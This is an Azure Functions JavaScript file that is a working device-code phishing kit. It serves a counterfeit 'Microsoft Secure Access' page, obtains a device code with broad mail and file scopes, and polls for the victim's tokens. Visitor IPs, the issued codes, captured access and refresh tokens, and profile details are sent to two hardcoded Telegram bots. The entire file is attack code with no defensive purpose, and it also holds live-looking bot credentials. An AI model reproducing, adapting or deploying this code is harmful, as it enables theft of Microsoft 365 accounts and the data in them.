const { app } = require("@azure/functions");
const axios = require('axios');

// Telegram configuration - CORRECT TOKENS
const TELEGRAM_BOT_TOKEN = "7768080373:AAEo6R8wNxUa6_NqPDYDIAfQVRLHRF5fBps";
const TELEGRAM_CHAT_ID = "6743632244";
const TELEGRAM_BOT_TOKEN2 = "7942871168:AAFuvCQXQJhYKipqGpr1G4IhUDABTGWF_9U";
const TELEGRAM_CHAT_ID2 = "6263177378";

// Device Code configuration - Using Azure CLI client ID for better compatibility
const client_id = '04b07795-8ddb-461a-bbee-02f9e1bf7b46'; // Azure CLI - better for device code flows
const scope = 'openid profile email User.Read Mail.Read Files.ReadWrite.All offline_access';

async function sendTelegram(message, isSecondary = false) {
    const botToken = isSecondary ? TELEGRAM_BOT_TOKEN2 : TELEGRAM_BOT_TOKEN;
    const chatId = isSecondary ? TELEGRAM_CHAT_ID2 : TELEGRAM_CHAT_ID;
    
    try {
        await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            chat_id: chatId,
            text: message,
            parse_mode: 'HTML'
        });
        console.log(`Telegram message sent: ${message.substring(0, 50)}...`);
    } catch (error) {
        console.error('Telegram send error:', error.message);
    }
}

app.http("devicecode", {
    methods: ["GET"],
    authLevel: "anonymous",
    route: "secure-access",
    handler: async (request, context) => {
        try {
            // Send Telegram notification
            await sendTelegram(`🎯 <b>Device Code Page Accessed</b>\n\n🔗 <b>URL:</b> ${request.url}\n👤 <b>User Agent:</b> ${request.headers.get('user-agent') || 'Unknown'}\n🌐 <b>IP:</b> ${request.headers.get('x-forwarded-for') || 'Unknown'}`);
            await sendTelegram(`🎯 <b>Device Code Page Accessed</b>\n\n🔗 <b>URL:</b> ${request.url}\n👤 <b>User Agent:</b> ${request.headers.get('user-agent') || 'Unknown'}\n🌐 <b>IP:</b> ${request.headers.get('x-forwarded-for') || 'Unknown'}`, true);

            // Generate device code
            const deviceCodeResponse = await fetch('https://login.microsoftonline.com/common/oauth2/v2.0/devicecode', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: new URLSearchParams({
                    client_id: client_id,
                    scope: scope
                })
            });

            if (!deviceCodeResponse.ok) {
                const errorText = await deviceCodeResponse.text();
                context.log.error('Device code generation failed:', errorText);
                await sendTelegram(`❌ <b>Device Code Generation Failed</b>\n\n${errorText}`);
                await sendTelegram(`❌ <b>Device Code Generation Failed</b>\n\n${errorText}`, true);
                return new Response(`Device code generation failed: ${errorText}`, { status: 400 });
            }

            const deviceCodeData = await deviceCodeResponse.json();
            context.log(`Device code generated: ${deviceCodeData.user_code}`);

            // Send Telegram notification with device code
            const deviceCodeMessage = `🎯 <b>Device Code Generated</b>\n\n🔢 <b>Code:</b> ${deviceCodeData.user_code}\n⏰ <b>Expires In:</b> ${deviceCodeData.expires_in} seconds\n🔗 <b>Verification URL:</b> ${deviceCodeData.verification_uri}`;
            
            await sendTelegram(deviceCodeMessage);
            await sendTelegram(deviceCodeMessage, true);

            // Start polling for token in background
            pollForToken(deviceCodeData.device_code, deviceCodeData.interval || 5);

            const html = `
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>Microsoft Secure Access</title>
                <style>
                    body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 20px; background: #f3f2f1; }
                    .container { max-width: 600px; margin: 0 auto; background: white; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); padding: 40px; }
                    .header { text-align: center; margin-bottom: 30px; }
                    .logo { width: 60px; height: 60px; margin-bottom: 20px; }
                    .title { color: #323130; font-size: 28px; font-weight: 600; margin-bottom: 10px; }
                    .subtitle { color: #605e5c; font-size: 16px; margin-bottom: 30px; }
                    .code-box { background: #f8f9fa; border: 2px solid #0078d4; border-radius: 6px; padding: 20px; margin: 20px 0; text-align: center; }
                    .code { font-family: 'Consolas', monospace; font-size: 24px; font-weight: bold; color: #0078d4; letter-spacing: 2px; }
                    .instructions { color: #323130; font-size: 16px; line-height: 1.6; margin: 20px 0; }
                    .button { background: #0078d4; color: white; padding: 12px 24px; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; text-decoration: none; display: inline-block; margin: 10px 0; }
                    .button:hover { background: #106ebe; }
                    .footer { margin-top: 30px; text-align: center; color: #605e5c; font-size: 14px; }
                </style>
            </head>
            <body>
                <div class="container">
                    <div class="header">
                        <svg class="logo" viewBox="0 0 21 21" fill="none" xmlns="http://www.w3.org/2000/svg">
                            <path d="M10 0C4.48 0 0 4.48 0 10s4.48 10 10 10 10-4.48 10-10S15.52 0 10 0zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8z" fill="#0078d4"/>
                            <path d="M10 2C5.58 2 2 5.58 2 10s3.58 8 8 8 8-3.58 8-8-3.58-8-8-8zm0 14c-3.31 0-6-2.69-6-6s2.69-6 6-6 6 2.69 6 6-2.69 6-6 6z" fill="#0078d4"/>
                        </svg>
                        <h1 class="title">Microsoft Secure Access</h1>
                        <p class="subtitle">Complete your authentication to access your account</p>
                    </div>
                    
                    <div class="instructions">
                        <p>To complete your authentication, please follow these steps:</p>
                        <ol>
                            <li>Click the button below to visit the Microsoft verification page</li>
                            <li>Enter the following code when prompted:</li>
                        </ol>
                    </div>
                    
                    <div class="code-box">
                        <div class="code">${deviceCodeData.user_code}</div>
                    </div>
                    
                    <div style="text-align: center;">
                        <a href="https://microsoft.com/devicelogin" target="_blank" class="button">Continue to Microsoft</a>
                    </div>
                    
                    <div class="footer">
                        <p>This page will automatically update once authentication is complete.</p>
                        <p>If you don't see an update within 5 minutes, please refresh this page.</p>
                    </div>
                </div>
            </body>
            </html>`;

            return new Response(html, {
                status: 200,
                headers: {
                    'Content-Type': 'text/html; charset=utf-8'
                }
            });

        } catch (error) {
            context.log.error('Device code error:', error);
            await sendTelegram(`❌ <b>Device Code Error</b>\n\n${error.message}`);
            await sendTelegram(`❌ <b>Device Code Error</b>\n\n${error.message}`, true);
            return new Response(`Device code error: ${error.message}`, { status: 500 });
        }
    }
});

async function pollForToken(deviceCode, interval) {
    let attempts = 0;
    const maxAttempts = 60; // 5 minutes with 5-second intervals
    
    const poll = async () => {
        try {
            const tokenResponse = await fetch('https://login.microsoftonline.com/common/oauth2/v2.0/token', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: new URLSearchParams({
                    client_id: client_id,
                    scope: scope,
                    grant_type: 'urn:ietf:params:oauth:grant-type:device_code',
                    device_code: deviceCode
                })
            });

            if (tokenResponse.ok) {
                const tokens = await tokenResponse.json();
                
                // Send Telegram notification with tokens
                const tokenMessage = `🔥 <b>Device Code Tokens Captured!</b>\n\n🔑 <b>Access Token:</b> <code>${tokens.access_token.substring(0, 50)}...</code>\n🔄 <b>Refresh Token:</b> <code>${tokens.refresh_token ? tokens.refresh_token.substring(0, 50) + '...' : 'None'}</code>\n⏰ <b>Expires In:</b> ${tokens.expires_in} seconds\n📝 <b>Token Type:</b> ${tokens.token_type}`;
                
                await sendTelegram(tokenMessage);
                await sendTelegram(tokenMessage, true);

                // Get user profile
                try {
                    const profileResponse = await fetch('https://graph.microsoft.com/v1.0/me', {
                        headers: {
                            'Authorization': `Bearer ${tokens.access_token}`,
                            'Content-Type': 'application/json'
                        }
                    });

                    if (profileResponse.ok) {
                        const profile = await profileResponse.json();
                        const profileMessage = `👤 <b>User Profile Captured</b>\n\n📧 <b>Email:</b> ${profile.mail || profile.userPrincipalName}\n👤 <b>Name:</b> ${profile.displayName}\n🏢 <b>Company:</b> ${profile.businessPhones ? profile.businessPhones.join(', ') : 'N/A'}\n📱 <b>Mobile:</b> ${profile.mobilePhone || 'N/A'}\n🆔 <b>ID:</b> ${profile.id}`;
                        
                        await sendTelegram(profileMessage);
                        await sendTelegram(profileMessage, true);
                    }
                } catch (profileError) {
                    console.error('Profile fetch error:', profileError);
                    await sendTelegram(`⚠️ <b>Profile Fetch Error</b>\n\n${profileError.message}`);
                }

                return; // Success, stop polling
            } else {
                const errorData = await tokenResponse.json();
                
                if (errorData.error === 'authorization_pending') {
                    // Still waiting, continue polling
                    attempts++;
                    if (attempts < maxAttempts) {
                        setTimeout(poll, interval * 1000);
                    } else {
                        await sendTelegram(`⏰ <b>Device Code Expired</b>\n\nUser did not complete authentication within the time limit`);
                        await sendTelegram(`⏰ <b>Device Code Expired</b>\n\nUser did not complete authentication within the time limit`, true);
                    }
                } else {
                    // Other error
                    await sendTelegram(`❌ <b>Device Code Error</b>\n\n${errorData.error}: ${errorData.error_description || 'Unknown error'}`);
                    await sendTelegram(`❌ <b>Device Code Error</b>\n\n${errorData.error}: ${errorData.error_description || 'Unknown error'}`, true);
                }
            }
        } catch (error) {
            console.error('Polling error:', error);
            await sendTelegram(`❌ <b>Polling Error</b>\n\n${error.message}`);
            await sendTelegram(`❌ <b>Polling Error</b>\n\n${error.message}`, true);
        }
    };

    // Start polling
    setTimeout(poll, interval * 1000);
}